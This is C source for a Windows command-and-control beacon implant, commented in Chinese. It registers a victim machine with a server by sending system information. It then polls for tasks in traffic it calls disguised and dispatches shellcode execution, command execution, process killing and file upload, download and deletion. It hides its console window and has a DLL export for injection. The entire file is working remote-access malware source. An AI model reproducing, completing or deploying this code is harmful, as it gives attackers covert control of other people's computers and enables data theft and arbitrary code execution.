#include "beacon.h"

// 全局变量定义
BEACON_CONFIG g_config = { 0 };
volatile BOOL g_beacon_running = FALSE;
char processPath[MAX_PATH * 2] = { 0 };
// 任务完成后的快速轮询窗口（毫秒级截止时间）。窗口内每 200ms 轮询一次以降低延迟
static DWORD g_fast_mode_until_ms = 0;

// 初始化全局变量
BEACON_ERROR init_globals(void) {
    memset(&g_config, 0, sizeof(BEACON_CONFIG));
    g_config.sleep_time = INITIAL_SLEEP_TIME;
    g_beacon_running = FALSE;
    return BEACON_SUCCESS;
}

// 清理全局变量
void cleanup_globals(void) {
    g_beacon_running = FALSE;
}

// 初始化函数
BEACON_ERROR beacon_init(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    // 获取系统UUID
    BEACON_ERROR error = get_system_uuid(config->uuid);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 初始化HTTP
    error = http_init();
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 设置初始配置
    config->sleep_time = INITIAL_SLEEP_TIME;

    // 复制配置到全局变量
    memcpy(&g_config, config, sizeof(BEACON_CONFIG));

    return BEACON_SUCCESS;
}

// 注册Beacon
static BEACON_ERROR register_beacon(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    char* json_data = NULL;
    char* response = NULL;
    DWORD response_len = 0;
    BEACON_ERROR error = BEACON_SUCCESS;

    // 收集系统信息
    error = collect_system_info(&json_data);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 发送注册请求
    HTTP_REQUEST request = {
        .method = L"POST",
        .path = REGISTER_ENDPOINT,
        .data = json_data,
        .data_len = strlen(json_data),
        .timeout = 30000,
        .use_ssl = USE_HTTPS
    };

    error = http_send_request(&request, &response, &response_len);
    if (error == BEACON_SUCCESS && response && response_len > 0) {
        // 解析响应中的client_id
        char* client_id_start = strstr(response, "clientId=");
        if (client_id_start && strlen(client_id_start) >= 45) { // "clientId=" + 36 UUID chars
            client_id_start += 9; // Skip "clientId="
            MultiByteToWideChar(CP_UTF8, 0, client_id_start, 36, config->client_id, UUID_LENGTH);
            swprintf_s(config->api_path, MAX_PATH_LENGTH, L"%ws?clientId=%ws", API_ENDPOINT, config->client_id);
        } else {
            error = BEACON_ERROR_NETWORK;
        }
    }

    // 清理
    if (json_data) free(json_data);
    if (response) free(response);

    return error;
}

// 主运行循环
BEACON_ERROR beacon_run(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    // 设置运行标志
    g_beacon_running = TRUE;

    // 注册beacon
    BEACON_ERROR error = register_beacon(config);
    if (error != BEACON_SUCCESS) {
        g_beacon_running = FALSE;
        return error;
    }

    // 主循环
    while (g_beacon_running) {
        char* response = NULL;
        DWORD response_len = 0;
        char* task_result = NULL;
        char* encoded_result = NULL;
        BOOL got_task = FALSE;

        // 发送心跳请求（GET方法）
        HTTP_REQUEST request = {
            .method = L"GET",
            .path = config->api_path,
            .data = "",
            .data_len = 0,
            .timeout = 30000,
            .use_ssl = USE_HTTPS
        };

        error = http_send_request(&request, &response, &response_len);
        
        // 检查是否收到服务器关闭信号
        if (error == BEACON_ERROR_SERVER_SHUTDOWN) {
            if (response) free(response);
            break;  // 退出循环
        }
        
        if (error == BEACON_SUCCESS && response && response_len > 0) {
            // 解包流量伪装
            char* unwrapped_response = unwrap_data_from_disguise(response);
            if (!unwrapped_response) {
                unwrapped_response = response; // 如果解包失败，使用原始数据
            }
            
            // 调试信息（可编译关闭）
            LOG_DEBUG("[DEBUG] Received response: length=%d, first_byte=0x%02x\n", response_len, response ? (unsigned char)response[0] : 0);
            if (response_len > 0) {
                LOG_DEBUG("[DEBUG] Response data (first up to 10 bytes): ");
                for (int i = 0; i < (response_len > 10 ? 10 : (int)response_len); i++) {
                    LOG_DEBUG("%02x ", (unsigned char)response[i]);
                }
                LOG_DEBUG("\n");
            }
            
            // 检查是否有任务（非空且非"0x00"）
            size_t unwrapped_len = strlen(unwrapped_response);
            if (unwrapped_len > 0 && !(unwrapped_len == 1 && unwrapped_response[0] == 0x00)) {
                // 执行任务（调试输出可关闭）
                LOG_DEBUG("[DEBUG] Executing task: type=0x%02x, length=%zu\n", (unsigned char)unwrapped_response[0], unwrapped_len);
                error = execute_task(unwrapped_response, unwrapped_len, config);
                if (unwrapped_response[0] != 0x00) { // 非空任务
                    got_task = TRUE;
                }
            }
            
            // 清理解包后的数据（如果与原始数据不同）
            if (unwrapped_response != response) {
                free(unwrapped_response);
            }
            
            if (error != BEACON_SUCCESS) {
                // 生成错误结果
                task_result = (char*)malloc(256);
                if (task_result) {
                    snprintf(task_result, 256, "Task execution failed with error: %d", error);
                }
            }
            // 注意：成功执行的任务不需要在这里生成结果，因为任务处理函数已经主动发送了结果

            // 清理任务结果（任务处理函数已经发送了实际结果）
            if (task_result) {
                free(task_result);
            }
        }

        // 清理响应
        if (response) {
            free(response);
        }

        // 进入快速轮询窗口：若刚处理过任务，则在接下来 5 秒内每 200ms 轮询一次
        if (got_task) {
            g_fast_mode_until_ms = GetTickCount() + 5000; // 5s 快速窗口，使用GetTickCount兼容性更好
        }

        // Sleep（检查运行状态）。快速窗口内使用 200ms 周期，否则按正常 sleep_time 秒
        if (g_beacon_running) {
            DWORD now = GetTickCount();
            if (g_fast_mode_until_ms != 0 && now < g_fast_mode_until_ms) {
                Sleep(200);
                continue; // 立即下一轮轮询以降低延迟
            }
            
            // 使用精确的睡眠时间，确保心跳间隔准确
            if (config->sleep_time > 0) {
                Sleep(config->sleep_time * 1000);
            } else {
                Sleep(1000); // 默认1秒
            }
        }
    }

    g_beacon_running = FALSE;
    return BEACON_SUCCESS;
}

// 清理函数
void beacon_cleanup(BEACON_CONFIG* config) {
    g_beacon_running = FALSE;
    http_cleanup();
}

// 任务执行函数
BEACON_ERROR execute_task(const char* task_data, size_t data_len, BEACON_CONFIG* config) {
    if (!task_data || !config || data_len == 0) {
        return BEACON_ERROR_PARAMS;
    }

    TASK_TYPE task_type = (TASK_TYPE)task_data[0];
    const char* task_payload = task_data + 1;
    size_t payload_len = data_len - 1;  // 减去类型字节
    
    // 调试信息（可编译关闭）
    LOG_DEBUG("[DEBUG] execute_task: task_type=0x%02x, payload_len=%zu\n", (unsigned int)task_type, payload_len);
    if (payload_len > 0 && payload_len < 100) {
        LOG_DEBUG("[DEBUG] task_payload: %.*s\n", (int)payload_len, task_payload);
    }
    


    switch (task_type) {
        case TASK_SLEEP:
            return handle_sleep_task(task_payload, config);
        
        case TASK_PROCLIST:
            return handle_proclist_task(task_payload, config);
        
        case TASK_SHELLCODE:
            return handle_shellcode_task(task_payload, payload_len, config);

        case TASK_EXECUTE:
            return handle_execute_task(task_payload, config);

        case TASK_PROC_KILL:
            return handle_proc_kill_task(task_payload, config);

        case TASK_FILE_LIST:
            return handle_file_list_task(task_payload, config);

        case TASK_FILE_DOWNLOAD:
            return handle_file_download_task(task_payload, config);

        case TASK_FILE_UPLOAD:
            return handle_file_upload_task(task_payload, config);

        case TASK_FILE_DELETE:
            return handle_file_delete_task(task_payload, config);

        case TASK_FILE_MKDIR:
            return handle_file_mkdir_task(task_payload, config);

        case TASK_FILE_INFO:
            return handle_file_info_task(task_payload, config);

        case TASK_NULL:
            return BEACON_SUCCESS;
        
        default:
            return BEACON_ERROR_PARAMS;
    }
}

#ifdef BUILD_DLL
// DLL入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // 初始化全局变量
            init_globals();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            // 清理
            cleanup_globals();
            break;
    }
    return TRUE;
}

// 导出函数：启动Beacon
BEACON_API DWORD WINAPI StartBeacon(LPVOID lpParam) {
    BEACON_CONFIG config = {0};
    
    // 初始化Beacon
    BEACON_ERROR error = beacon_init(&config);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 运行Beacon
    error = beacon_run(&config);
    
    // 清理
    beacon_cleanup(&config);
    
    return error;
}

// 导出函数：停止Beacon
BEACON_API BOOL WINAPI StopBeacon(void) {
    g_beacon_running = FALSE;
    return TRUE;
}

#else
// EXE入口点
int main(void) {
    // 隐藏控制台窗口
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 初始化全局变量
    init_globals();

    // 初始化配置
    BEACON_CONFIG config = {0};
    
    // 初始化Beacon
    BEACON_ERROR error = beacon_init(&config);
    if (error != BEACON_SUCCESS) {
        cleanup_globals();
        return 1;
    }

    // 运行Beacon
    error = beacon_run(&config);
    
    // 清理
    beacon_cleanup(&config);
    cleanup_globals();
    
    return (error == BEACON_SUCCESS) ? 0 : 1;
}
#endif 